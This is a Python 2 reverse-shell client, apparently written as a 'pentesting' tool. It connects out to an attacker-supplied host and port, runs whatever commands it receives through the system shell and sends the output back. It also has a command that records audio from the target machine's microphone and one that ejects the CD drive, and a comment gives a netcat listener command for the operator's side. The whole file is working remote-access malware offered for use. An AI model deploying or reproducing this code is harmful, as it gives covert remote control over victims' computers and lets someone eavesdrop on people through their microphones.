#!/usr/bin/env python
# -*- coding: utf-8 -*- 

"""
Tool made only for pentesting.

Small and nasty.

Update: It now has a function that allows recording audio from the target
machine's microphone.
"""


# put netcat in mode listener, to test
# nc -l -v -p <port_to_connect>

import subprocess, os, sys, time, threading, signal, random, fnmatch
from socket import *
from time import sleep
from threading import Thread
from escuta import escuta

print "\n"

if (len(sys.argv) == 3):
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    sys.exit("Example: python client.py <server ip> <server port>")


# Used to make sure a subprocess lasts 30 seconds max

class Alarm(Exception):
    pass


def time():
    time.timelocaltime()
    pass


def alarm_handler(signum, frame):
    raise Alarm


def main(host, port):
    while True:
        connected = False
        while 1:
            while (connected == False):
                try:
                    s = socket(AF_INET, SOCK_STREAM)
                    s.connect((host, port))
                    connected = True
                except:
                    IOError

            try:
                msg = s.recv(20480)
                allofem = msg.split(",")
                for onebyone in allofem:
                    commands = onebyone.split()
                    if (commands[0] == "cd"):
                        if (len(commands) > 1): os.chdir(commands[1])
                        s.send(os.getcwd())
                        print "\n" % os.getcwd()
                    elif (commands[0] == "pwd"):
                        s.send(os.getcwd())
                    elif (commands[0] == "escuta"):
                        escuta()
                    # elif (commands[0] == "grampo"):
                    #       grampo = []
                    #      grampo = os.system("python som.py")
                    elif (commands[0] == "pararescuta"):
                        pararescuta = os.system("clear")
                    elif (commands[0] == "opencd"):
                        hc = []
                        hc = os.system("eject")
                    elif (commands[0] == "quit"):
                        s.close()
                        print "\n"
                        break
                    else:
                        thecommand = ' '.join(commands)
                        comm = subprocess.Popen(thecommand, shell=True,
                                                stdout=subprocess.PIPE,
                                                stderr=subprocess.PIPE,
                                                stdin=subprocess.PIPE)
                        signal.signal(signal.SIGALRM, alarm_handler)
                        signal.alarm(30)
                        try:
                            STDOUT, STDERR = comm.communicate()
                            en_STDERR = bytearray(STDERR)
                            en_STDOUT = bytearray(STDOUT)
                            if (en_STDERR == ""):
                                if (en_STDOUT != ""):
                                    print (en_STDOUT)
                                    s.send(en_STDOUT)
                                else:
                                    s.send(en_STDOUT)
                                    pass
                            else:
                                print en_STDERR
                                s.send(en_STDERR)
                        except Alarm:
                            comm.terminate()
                            comm.kill()
                            s.send("\n")
                        signal.alarm(5)
            except KeyboardInterrupt:
                s.close()
                print "\n"
                break
            except:
                s.close()
                print "\n"
                break


while True:

    try:
        main(host, port)
        escuta()
        time()
    except KeyboardInterrupt:
        s.close()
